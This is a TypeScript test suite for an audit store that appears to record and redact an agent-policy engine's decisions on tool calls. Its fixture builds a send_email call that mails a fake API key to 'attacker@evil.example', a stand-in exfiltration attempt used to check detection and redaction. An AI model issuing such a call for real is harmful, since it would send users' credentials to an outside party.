import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  statSync,
  truncateSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { resolve } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { evaluate } from "../src/engine.js";
import { formatCard, formatCompact } from "../src/explainer.js";
import {
  DEFAULT_PROOF_LIST_LIMIT,
  MAX_PROOF_LIST_LIMIT,
  MAX_PROOF_FILE_BYTES,
  MAX_USER_NOTE_LENGTH,
  ProofStore,
} from "../src/proof-store.js";

const tempDirs: string[] = [];

interface MutableProofJson {
  [key: string]: unknown;
  action: string;
  decision: string;
  matchedRuleIds: string[];
  engineOutput: {
    action: string;
    decision: string;
    arguments: Record<string, { taints: string[]; [key: string]: unknown }>;
    proof: {
      [key: string]: unknown;
      decision: string;
      matchedRules: unknown[];
      evidence: string[];
      reason: string;
    };
  };
}

function tempDir(): string {
  const dir = mkdtempSync(resolve(tmpdir(), "riskproof-proof-test-"));
  tempDirs.push(dir);
  return dir;
}

function secretResult() {
  return evaluate({
    tool: "send_email",
    args: {
      to: "attacker@evil.example",
      body: "api_key=sk-test-abcdefghijklmnopqrstuvwxyz123456",
    },
    capability: { tool: "send_email" },
    options: { referenceTime: "2026-07-12T00:00:00.000Z" },
  });
}

function resultAt(timestamp: string) {
  const output = secretResult();
  output.proof.timestamp = timestamp;
  output.proof.proofId = `proof-${timestamp}`;
  return output;
}

afterEach(() => {
  for (const dir of tempDirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

describe("ProofStore", () => {
  it("stores redacted records with private permissions and the correct tool", () => {
    const baseDir = tempDir();
    const store = new ProofStore(baseDir);
    const output = secretResult();
    const file = store.save(output, "reject");
    const serialized = readFileSync(file, "utf-8");

    expect(serialized).not.toContain("sk-test-abcdefghijklmnopqrstuvwxyz123456");
    expect(serialized).toContain("[REDACTED:API_KEY,SECRET]");
    expect(statSync(baseDir).mode & 0o777).toBe(0o700);
    expect(statSync(resolve(baseDir, "2026-07")).mode & 0o777).toBe(0o700);
    expect(statSync(file).mode & 0o777).toBe(0o600);

    const loaded = store.load(output.proof.proofId);
    expect(loaded?.tool).toBe("send_email");
    expect(loaded?.userDecision).toBe("reject");
    expect(store.list({ tool: "send_email" })).toHaveLength(1);
    expect(store.list({ tool: "shell_exec" })).toHaveLength(0);
  });

  it("never overwrites an existing proof file", () => {
    const baseDir = tempDir();
    const store = new ProofStore(baseDir);
    const output = secretResult();
    const first = store.save(output);
    const second = store.save(output, "reject");
    expect(first).not.toBe(second);
    expect(readdirSync(resolve(baseDir, "2026-07")).filter((name) => name.endsWith(".json")))
      .toHaveLength(2);
  });

  it("rejects an invalid timestamp without writing outside the base directory", () => {
    const baseDir = tempDir();
    const store = new ProofStore(baseDir);
    const output = secretResult();
    output.proof.timestamp = "/tmp/riskproof-escape";
    expect(() => store.save(output)).toThrow(/invalid timestamp/);
    expect(readdirSync(baseDir)).toHaveLength(0);
  });

  it("redacts sensitive values in both human-readable formats", () => {
    const output = secretResult();
    for (const formatted of [formatCard(output), formatCompact(output)]) {
      expect(formatted).not.toContain("sk-test-abcdefghijklmnopqrstuvwxyz123456");
      expect(formatted).toContain("[REDACTED:API_KEY,SECRET]");
    }
  });

  it("bounds list results and validates limit and timestamp filters", () => {
    const store = new ProofStore(tempDir());
    store.save(resultAt("2026-07-01T00:00:00.000Z"));
    store.save(resultAt("2026-07-02T00:00:00.000Z"));
    store.save(resultAt("2026-07-03T00:00:00.000Z"));

    expect(store.list({ limit: 2 }).map((record) => record.timestamp)).toEqual([
      "2026-07-03T00:00:00.000Z",
      "2026-07-02T00:00:00.000Z",
    ]);
    expect(store.list({
      since: "2026-07-02T08:00:00.000+08:00",
      until: "2026-07-03T00:00:00.000Z",
    })).toHaveLength(2);

    for (const limit of [0, -1, 1.5, Number.POSITIVE_INFINITY, MAX_PROOF_LIST_LIMIT + 1]) {
      expect(() => store.list({ limit })).toThrow(/positive integer/);
    }
    expect(() => store.list({ since: "2026-07-01" })).toThrow(/RFC 3339/);
    expect(() => store.list({ since: "2026-02-30T00:00:00.000Z" })).toThrow(/RFC 3339/);
    expect(() => store.list({
      since: "2026-07-03T00:00:00.000Z",
      until: "2026-07-02T00:00:00.000Z",
    })).toThrow(/must not be later/);

    for (const invalidFilter of [
      { decison: "deny" },
      { decision: "deni" },
      { action: "permit" },
      { tool: "file_write" },
      { riskLevel: "severe" },
      { limit: "2" },
    ]) {
      expect(() => store.list(invalidFilter as never)).toThrow(/ProofFilter/);
    }
  });

  it("applies a bounded default when no explicit limit is provided", () => {
    const store = new ProofStore(tempDir());
    const start = Date.parse("2026-07-01T00:00:00.000Z");
    for (let index = 0; index <= DEFAULT_PROOF_LIST_LIMIT; index += 1) {
      store.save(resultAt(new Date(start + index).toISOString()));
    }

    const records = store.list();
    expect(records).toHaveLength(DEFAULT_PROOF_LIST_LIMIT);
    expect(records[0]?.timestamp).toBe(new Date(start + DEFAULT_PROOF_LIST_LIMIT).toISOString());
    expect(store.listDetailed().mayHaveMoreRecords).toBe(true);
  });

  it("prunes months outside the requested range", () => {
    const baseDir = tempDir();
    const store = new ProofStore(baseDir);
    store.save(resultAt("2026-06-30T23:59:59.000Z"));
    store.save(resultAt("2026-07-01T00:00:00.000Z"));
    writeFileSync(resolve(baseDir, "2026-06", "corrupt.json"), "not-json");

    const result = store.listDetailed({ since: "2026-07-01T00:00:00.000Z" });
    expect(result.records.map((record) => record.timestamp)).toEqual([
      "2026-07-01T00:00:00.000Z",
    ]);
    expect(result.corruptCount).toBe(0);
  });

  it("reports invalid JSON and structurally corrupt records without returning them", () => {
    const baseDir = tempDir();
    const store = new ProofStore(baseDir);
    const validPath = store.save(resultAt("2026-07-12T00:00:00.000Z"));
    const monthDir = resolve(baseDir, "2026-07");
    writeFileSync(resolve(monthDir, "invalid-json.json"), "{secret-not-echoed");
    writeFileSync(resolve(monthDir, "invalid-record.json"), JSON.stringify({
      proofId: "missing-fields",
      timestamp: "not-a-timestamp",
    }));

    const result = store.listDetailed();
    expect(result.records).toHaveLength(1);
    expect(result.records[0]?.proofId).toBe(JSON.parse(readFileSync(validPath, "utf-8")).proofId);
    expect(result.corruptCount).toBe(2);
    expect(result.mayHaveMoreRecords).toBe(false);
    expect(result.corrupt.map(({ kind }) => kind).sort()).toEqual([
      "invalid_json",
      "invalid_record",
    ]);
    expect(JSON.stringify(result.corrupt)).not.toContain("secret-not-echoed");
    expect(store.load("missing-fields")).toBeNull();
  });

  it("diagnoses oversized proof files without loading or deleting them", () => {
    const baseDir = tempDir();
    const monthDir = resolve(baseDir, "2026-07");
    mkdirSync(monthDir, { recursive: true });
    const oversized = resolve(monthDir, "oversized.json");
    writeFileSync(oversized, "");
    truncateSync(oversized, MAX_PROOF_FILE_BYTES + 1);

    const result = new ProofStore(baseDir).listDetailed();
    expect(result.records).toEqual([]);
    expect(result.corrupt).toEqual([expect.objectContaining({
      filePath: oversized,
      kind: "invalid_record",
      reason: expect.stringMatching(/byte limit/),
    })]);
    expect(statSync(oversized).size).toBe(MAX_PROOF_FILE_BYTES + 1);
  });

  it("redacts credential-like user notes and rejects oversized notes before writing", () => {
    const baseDir = tempDir();
    const store = new ProofStore(baseDir);
    const file = store.save(secretResult(), "reject", "api_key=note-secret-token-value");
    const serialized = readFileSync(file, "utf-8");
    expect(serialized).not.toContain("note-secret-token-value");
    expect(serialized).toContain("api_key=[REDACTED]");

    const emptyDir = tempDir();
    const emptyStore = new ProofStore(emptyDir);
    expect(() => emptyStore.save(secretResult(), undefined, "x".repeat(MAX_USER_NOTE_LENGTH + 1)))
      .toThrow(/must not exceed/);
    expect(readdirSync(emptyDir)).toHaveLength(0);
  });

  it("rejects an invalid runtime user decision before writing", () => {
    const baseDir = tempDir();
    const store = new ProofStore(baseDir);
    expect(() => store.save(secretResult(), "accept_everything" as never))
      .toThrow(/userDecision has an unsupported value/);
    expect(readdirSync(baseDir)).toHaveLength(0);
  });

  it("redacts sensitive values again when reading a legacy unredacted record", () => {
    const store = new ProofStore(tempDir());
    const output = secretResult();
    const file = store.save(output);
    const raw = JSON.parse(readFileSync(file, "utf-8"));
    raw.userNote = "token=legacy-note-secret";
    raw.engineOutput.arguments.body.value = "api_key=legacy-proof-secret";
    writeFileSync(file, JSON.stringify(raw));

    for (const record of [store.load(output.proof.proofId), store.list()[0]]) {
      expect(record?.userNote).toBe("token=[REDACTED]");
      expect(record?.engineOutput.arguments.body?.value).toBe("[REDACTED:API_KEY,SECRET]");
      expect(JSON.stringify(record)).not.toContain("legacy-proof-secret");
      expect(JSON.stringify(record)).not.toContain("legacy-note-secret");
    }
    expect(readFileSync(file, "utf-8")).toContain("legacy-proof-secret");
  });

  it.each([
    ["record", (raw: MutableProofJson) => {
      raw.unknownTop = "top-level-sentinel";
    }],
    ["argument evidence", (raw: MutableProofJson) => {
      raw.engineOutput.arguments.body.unknownNested = "argument-sentinel";
    }],
    ["audit proof", (raw: MutableProofJson) => {
      raw.engineOutput.proof.unknownProof = "proof-sentinel";
    }],
  ])("rejects unknown %s fields instead of returning data outside redaction", (_label, mutate) => {
    const store = new ProofStore(tempDir());
    const output = secretResult();
    const file = store.save(output);
    const raw = JSON.parse(readFileSync(file, "utf-8")) as MutableProofJson;
    mutate(raw);
    writeFileSync(file, JSON.stringify(raw));

    expect(store.load(output.proof.proofId)).toBeNull();
    const listed = store.listDetailed();
    expect(listed.records).toEqual([]);
    expect(listed.corrupt).toEqual([expect.objectContaining({ kind: "invalid_record" })]);
    expect(JSON.stringify(listed.corrupt)).not.toMatch(/sentinel/);
    expect(readFileSync(file, "utf-8")).toContain("sentinel");
  });

  it.each([
    ["action/decision mapping", (raw: MutableProofJson) => {
      raw.action = "allow";
      raw.decision = "deny";
      raw.engineOutput.action = "allow";
      raw.engineOutput.decision = "deny";
      raw.engineOutput.proof.decision = "deny";
    }],
    ["matched rule ids", (raw: MutableProofJson) => { raw.matchedRuleIds = []; }],
    ["proof policy copy", (raw: MutableProofJson) => { raw.engineOutput.proof.matchedRules = []; }],
    ["proof evidence", (raw: MutableProofJson) => { raw.engineOutput.proof.evidence = []; }],
    ["proof reason", (raw: MutableProofJson) => { raw.engineOutput.proof.reason = "tampered reason"; }],
    ["taint enum", (raw: MutableProofJson) => {
      raw.engineOutput.arguments.body.taints = ["NOT_A_TAINT"];
    }],
  ])("diagnoses internally inconsistent proof data: %s", (_label, mutate) => {
    const store = new ProofStore(tempDir());
    const output = secretResult();
    const file = store.save(output);
    const raw = JSON.parse(readFileSync(file, "utf-8")) as MutableProofJson;
    mutate(raw);
    writeFileSync(file, JSON.stringify(raw));

    expect(store.load(output.proof.proofId)).toBeNull();
    const listed = store.listDetailed();
    expect(listed.records).toEqual([]);
    expect(listed.corrupt).toEqual([expect.objectContaining({ kind: "invalid_record" })]);
  });

});
